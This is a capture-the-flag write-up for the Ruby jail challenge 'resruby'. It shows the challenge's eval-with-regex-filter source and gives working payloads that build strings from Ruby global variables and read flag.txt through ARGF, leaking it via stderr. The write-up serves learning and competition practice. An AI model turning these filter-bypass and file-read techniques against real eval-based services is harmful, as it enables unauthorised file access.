# resruby (4 solves)

> when people say they like ruby for its simplicity, this is what they mean, right?
>
> nc resruby.challs.csc.tf 1337
>
> **Author:** oh_word

I partecipated to the first edition of `CyberSpace CTF` with [@TheRomanXpl0it](https://theromanxpl0.it/). It's always nice to see some jail challenges so, I decided to write a writeup for the challenge I liked the most: resruby.

<!--more-->

# Index
 - [Overview](#overview)
   - [Source](#source)
   - [Building strings from scratch](#building-strings-from-scratch)
   - [Reading and leaking the flag](#reading-and-leaking-the-flag)
 - [Solve](#solve)
 - [Flag](#flag)
 - [Considerations](#considerations)
 - [Resources](#resources)
   

# Overview
Since this category was in the `jail` category, it can be deduced that it requires executing arbitrary code while bypassing some checks/restrictions.

With that in mind, let's take a look at the source code

## Source
We're given a single file called `chall.rb`
```rb
STDOUT.sync = true
STDOUT.class.send(:remove_method, :<<)

print "safe code > "
code = gets.chomp

if code =~ /[\w?'"`]/
  puts "not safe"
  exit 1
end

puts "ok"
eval code
```

There's not much going on, the only restriction is the regex ```/[\w?'"`]/```:
 - `[...]` - Match a single character present in the list below
 - `\w` - matches any word character (equivalent to `[a-zA-Z0-9_]`)
 - ``` ?'"` ``` matches a single character in the list

With this regex it's impossible to execute trivial payloads to obtain RCE/Arbitrary file read.
Also, the `<<` method of `STDOUT` is disabled so it's impossible to print the flag to stdout

It's quite rare to see CTFs with a ruby ​​jail. Luckily for me, I solved a few ruby jails before so roughly I already had in mind what to do. The only tricky parts were:
 - Building strings from scratch
 - Leaking the flag

## Building strings from scratch
From the previous ruby jail I learned that it's not required to use quotes to create strings by using this payload

```rb
A=%<>       # creates an empty string
A<<?f
A<<?l
A<<?a
A<<?g
A<<?.
A<<?t
A<<?x
A<<?t
p A         # it will print flag.txt
```

The previous syntax is allowed in ruby but not in our case.
Another way to build strings from scratch is the following

```rb
A=%<>
A<<102          # f
A<<108          # l
A<<97           # a
A<<103          # g
A<<46           # .
A<<116          # t
A<<120          # x
A<<116          # t
```

Since we can't even use numbers, we need to find a way to "build" them.

I found out that ruby golf cheatsheets contain useful information to solve ruby jail challenges.
By default, ruby has some special global variables. A list of them can be found [here](https://medium.com/ruby-golf/ruby-golf-cheatsheet-eb27ec2cdf60#Special%20variables).

A variable that is useful in this case is `$.`:
```rb
$.   # The current line number of the last file from input.
```

After taking our input, this variable will always contains `1`. We also need a way to store strings without using letters. By fuzzing I found out the variable $, can do so:

```rb
$,   # The output field separator for the print and Array#join.  Defaults to nil.
```

With that in mind, I created a simple function to solve our problem:

```py

def to_num(f):
    return '+'.join('$.' for x in range(f)) if f else '$.-$.'


print(f"""
$,=%<>
$,<<{to_num(102)}
$,<<{to_num(108)}
$,<<{to_num(97)}
$,<<{to_num(103)}
$,<<{to_num(46)}
$,<<{to_num(116)}
$,<<{to_num(120)}
$,<<{to_num(116)}
""")
```

## Reading and leaking the flag

Now comes the trickiest part.
In order to read files we can use [ARGF](https://ruby-doc.org/core-2.5.1/ARGF.html) which is the same as `$<`. Here's an example:

```
$*<<"flag.txt"      # Put "flag.txt" inside ARGV
p *$<               # Print the content of "flag.txt"
```
Note that `ARGF` operates on the file names inside `ARGV`.
Since we can't print the flag to stdout, we can leak it in this way:

```py
open(open("flag.txt").read()) # We need an equivalent payload in ruby
```

I noticed that `$:` (which is the equivalent of `$LOAD_PATH`) might be useful for us. Although $: is read-only, you can replace its elements to store strings (or any value).

```rb
$: = "test"         # not allowed
$:[0] = "test"      # allowed
```

Now we have everything to write a working payload which will leak the content of `flag.txt.`

# Solve

```rb
$,=%<>                  # empty string
$,<<102                 # f
$,<<108                 # l
$,<<97                  # a
$,<<103                 # g
$,<<46                  # .
$,<<116                 # t
$,<<120                 # x
$,<<116                 # t
$*<<$,                  # ARGV -> ["flag.txt"]
$:[0]=*$<               # read "flag.txt" and put it inside $: at index 0
$*<<$:[0][0]            # Put the content of flag.txt inside ARGV
$,=*$<                  # print the flag to stderr
```

You can find the final payload [here](https://gist.github.com/salvatore-abello/260c5380d55dc281c959d087718ee5ef)

# Flag

```
CSCTF{what_was_harder?_leaking_flag_or_getting_strings}
```

# Considerations

A revenge challenge has also been released where there's a limit of 35 characters to our input. A shorter payload could be made by reading from STDIN the flag path.
By doing so, the payload becomes:

```rb
$*.<<(*$<) # read from stdin
$*.<<(*$<) # read from flag.txt
$*.<<(*$<) # leak the flag
```

In order to make this payload work, you need close stdin from further reading. You can do that by pressing `CTRL+D` but it only works locally.
Since you can't directly send `CTRL+D` to the remote server, you can use `remote.shutdown` (Thanks to @lydxn).
I didn't know that `remote.shutdown` existed so I was unable to solve the revenge version.

But at the end, it was a fun challenge to solve ❤️

Thanks to the authors for the challenge and for the CTF in general.

# Resources
Ruby Docs - [Click here](https://ruby-doc.org/)\
Ruby Global Variables - [Click here](https://rubyreferences.github.io/rubyref/language/globals.html)\
Ruby Golf Cheatsheet - [Click here](https://medium.com/ruby-golf/ruby-golf-cheatsheet-eb27ec2cdf60#Special%20variables)\
Another Ruby Golf Cheatsheet - [Click here](https://github.com/siman-man/ruby-golf-style-guide)